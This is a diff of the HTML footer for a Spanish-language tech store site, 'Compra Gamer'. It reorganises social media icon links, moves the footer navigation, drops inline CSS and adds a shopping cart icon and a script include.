-                            <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"></path>
-                        </svg>
-                    </div>
-                </a>
+    <footer>
+        <div class="footer-content">
+            <h3>Compra Gamer</h3>
+            <p>Tu tienda de confianza para productos y servicios de tecnología.</p>
+            <h4>Siguenos</h4>
                 <div class="icono-contenedor">
-                    <a href="https://www.facebook.com/compragamer">
+                    <a href="https://www.twitch.tv/compragamerok">
                         <div class="icono-circulo">
-                            <svg class="icono-hover" height="100%" width="100%" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 310 310">
-                                <g>
-                                    <path d="M81.703,165.106h33.981V305c0,2.762,2.238,5,5,5h57.616c2.762,0,5-2.238,5-5V165.765h39.064
-                                        c2.54,0,4.677-1.906,4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899c-0.949-1.064-2.307-1.673-3.732-1.673h-44.996
-                                        V71.978c0-9.732,5.24-14.667,15.576-14.667c1.473,0,29.42,0,29.42,0c2.762,0,5-2.239,5-5V5.037c0-2.762-2.238-5-5-5h-40.545
-                                        C187.467,0.023,186.832,0,185.896,0c-7.035,0-31.488,1.381-50.804,19.151c-21.402,19.692-18.427,43.27-17.716,47.358v37.752H81.703
-                                        c-2.762,0-5,2.238-5,5v50.844C76.703,162.867,78.941,165.106,81.703,165.106z"></path>
-                                </g>
+                            <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M2.149 0l-1.612 4.119v16.836h5.731v3.045h3.224l3.045-3.045h4.657l6.269-6.269v-14.686h-21.314zm19.164 13.612l-3.582 3.582h-5.731l-3.045 3.045v-3.045h-4.836v-15.045h17.194v11.463zm-3.582-7.343v6.262h-2.149v-6.262h2.149zm-5.731 0v6.262h-2.149v-6.262h2.149z"></path>
                             </svg>
                         </div>
                     </a>
-                    <a href="https://www.tiktok.com/@compragamer.com?lang=es">
+                    <a href="https://x.com/CompraGamerOK">
                         <div class="icono-circulo">
-                            <svg class="icono-hover" width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M22.0901 9.84202C20.017 9.84696 17.9947 9.20321 16.3089 8.00171V16.3813C16.3083 17.9333 15.8319 19.4482 14.9433 20.7233C14.0548 21.9984 12.7964 22.973 11.3365 23.5168C9.8766 24.0606 8.28476 24.1477 6.77382 23.7664C5.26288 23.3851 3.90487 22.5536 2.88137 21.383C1.85787 20.2125 1.21767 18.7587 1.04637 17.2161C0.875071 15.6735 1.18084 14.1156 1.92279 12.7507C2.66474 11.3858 3.8075 10.279 5.19828 9.57823C6.58906 8.87746 8.16155 8.61616 9.70551 8.82927V13.0439C8.99899 12.8227 8.24032 12.8293 7.53784 13.063C6.83535 13.2966 6.22498 13.7453 5.79389 14.345C5.36279 14.9446 5.13302 15.6646 5.13738 16.402C5.14174 17.1395 5.38002 17.8567 5.81818 18.4512C6.25634 19.0458 6.87198 19.4873 7.57717 19.7127C8.28237 19.9381 9.04107 19.9359 9.74492 19.7063C10.4488 19.4768 11.0618 19.0316 11.4964 18.4345C11.931 17.8374 12.165 17.1188 12.165 16.3813V0H16.3089C16.306 0.348435 16.3354 0.696395 16.3965 1.03948C16.5405 1.80537 16.8399 2.53396 17.2764 3.18068C17.7129 3.8274 18.2773 4.37867 18.9351 4.80075C19.871 5.41688 20.9682 5.74528 22.0901 5.74505V9.84202Z"></path>
+                            <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 20">
+                                <path d="M17.244 0.25H20.552L13.325 8.51L21.827 19.75H15.17L9.956 12.933L3.99 19.75H0.679998L8.41 10.915L0.253998 0.25H7.08L11.793 6.481L17.244 0.25ZM16.083 17.77H17.916L6.084 2.126H4.117L16.083 17.77Z"></path>
                             </svg>
                         </div>
                     </a>
-                </div>                    
+                    <a href="https://www.youtube.com/c/CompraGamer">
+                        <div class="icono-circulo">
+                            <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path>
+                            </svg>
+                        </div>
+                    </a>
+                    <a href="https://www.linkedin.com/company/newton-station-srl/mycompany/">
+                        <div class="icono-circulo">
+                            <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"></path>
+                            </svg>
+                        </div>
+                    </a>
+                    <a href="https://www.instagram.com/compragamer_oficial/">
+                        <div class="icono-circulo">
+                            <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"></path>
+                            </svg>
+                        </div>
+                    </a>
+                    <div class="icono-contenedor">
+                        <a href="https://www.facebook.com/compragamer">
+                            <div class="icono-circulo">
+                                <svg class="icono-hover" height="100%" width="100%" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 310 310">
+                                    <g>
+                                        <path d="M81.703,165.106h33.981V305c0,2.762,2.238,5,5,5h57.616c2.762,0,5-2.238,5-5V165.765h39.064
+                                            c2.54,0,4.677-1.906,4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899c-0.949-1.064-2.307-1.673-3.732-1.673h-44.996
+                                            V71.978c0-9.732,5.24-14.667,15.576-14.667c1.473,0,29.42,0,29.42,0c2.762,0,5-2.239,5-5V5.037c0-2.762-2.238-5-5-5h-40.545
+                                            C187.467,0.023,186.832,0,185.896,0c-7.035,0-31.488,1.381-50.804,19.151c-21.402,19.692-18.427,43.27-17.716,47.358v37.752H81.703
+                                            c-2.762,0-5,2.238-5,5v50.844C76.703,162.867,78.941,165.106,81.703,165.106z"></path>
+                                    </g>
+                                </svg>
+                            </div>
+                        </a>
+                        <a href="https://www.tiktok.com/@compragamer.com?lang=es">
+                            <div class="icono-circulo">
+                                <svg class="icono-hover" width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M22.0901 9.84202C20.017 9.84696 17.9947 9.20321 16.3089 8.00171V16.3813C16.3083 17.9333 15.8319 19.4482 14.9433 20.7233C14.0548 21.9984 12.7964 22.973 11.3365 23.5168C9.8766 24.0606 8.28476 24.1477 6.77382 23.7664C5.26288 23.3851 3.90487 22.5536 2.88137 21.383C1.85787 20.2125 1.21767 18.7587 1.04637 17.2161C0.875071 15.6735 1.18084 14.1156 1.92279 12.7507C2.66474 11.3858 3.8075 10.279 5.19828 9.57823C6.58906 8.87746 8.16155 8.61616 9.70551 8.82927V13.0439C8.99899 12.8227 8.24032 12.8293 7.53784 13.063C6.83535 13.2966 6.22498 13.7453 5.79389 14.345C5.36279 14.9446 5.13302 15.6646 5.13738 16.402C5.14174 17.1395 5.38002 17.8567 5.81818 18.4512C6.25634 19.0458 6.87198 19.4873 7.57717 19.7127C8.28237 19.9381 9.04107 19.9359 9.74492 19.7063C10.4488 19.4768 11.0618 19.0316 11.4964 18.4345C11.931 17.8374 12.165 17.1188 12.165 16.3813V0H16.3089C16.306 0.348435 16.3354 0.696395 16.3965 1.03948C16.5405 1.80537 16.8399 2.53396 17.2764 3.18068C17.7129 3.8274 18.2773 4.37867 18.9351 4.80075C19.871 5.41688 20.9682 5.74528 22.0901 5.74505V9.84202Z"></path>
+                                </svg>
+                            </div>
+                        </a>
+                    </div>                    
+                </div>
             </div>
+            <div class="footer-links">
+                <a href="inicio.html" class="links">Productos</a>
+                <a href="computadoras-armadas.html" class="links">Computadoras</a>
+                <a href="servicios.html" class="links">Servicios</a>
+                <a href="carrito.html" class="links">Carrito</a>
+            </div>
+            <p>Contacta con nosotros: <a href="maxibutierrez10@gmail.com">maxibutierrez10@gmail.com</a></p>
+            <p>© 2024 Compra Gamer. Todos los derechos reservados.</p>
         </div>
-        <div class="footer-links">
-            <a href="inicio.html" class="links">Productos</a>
-            <a href="computadoras-armadas.html" class="links">Computadoras</a>
-            <a href="servicios.html" class="links">Servicios</a>
-            <a href="carrito.html" class="links">Carrito</a>
-        </div>
-        <p>Contacta con nosotros: <a href="maxibutierrez10@gmail.com">maxibutierrez10@gmail.com</a></p>
-        <p>© 2024 Compra Gamer. Todos los derechos reservados.</p>
+    </footer>
+
+    <div id="carrito-icon">
+        <a href="carrito.html">
+            <img src="https://i.postimg.cc/FHg3gMLM/Carrito-de-compras.png" alt="Carrito de compras">
+        </a>
+        <span id="carrito-count-icon" class="carrito-count-icon">0</span>
     </div>
-    <style>
-footer {
-    background: #333;
-    color: white;
-    padding: 20px;
-    text-align: center;
-    width: auto;
-    margin-top: 20px;
-}
 
-.footer-content {
-    max-width: 1200px;
-    margin: auto;
-}
-
-.footer-links {
-    display: flex;
-    justify-content: center;
-    margin: 10px 0;
-}
-
-.links {
-    color: white;
-    margin: 0 15px;
-    text-decoration: none;
-    transition: color 0.5s;
-}
-
-.links:hover {
-    color: #ff0000;
-}
-
-.icono-contenedor {
-    display: flex;
-    gap: 20px;
-    justify-content: center;
-    align-items: center;
-}
-
-.icono-circulo {
-    background-color: black;
-    border: 1px solid white;
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    transition: background-color 0.3s ease, transform 0.3s ease;
-}
-
-.icono-circulo:hover {
-    background-color: white;
-    transform: scale(1.1);
-}
-
-.icono-hover {
-    fill: white;
-    transition: fill 0.3s ease;
-    width: 50%;
-    height: 50%;
-}
-
-.icono-circulo:hover .icono-hover {
-    fill: red;
-}
-
-    </style>
-</footer>
+    <script src="https://compragamer.neocities.org/js/JavaScript.js"></script>
+</body>
 </html>
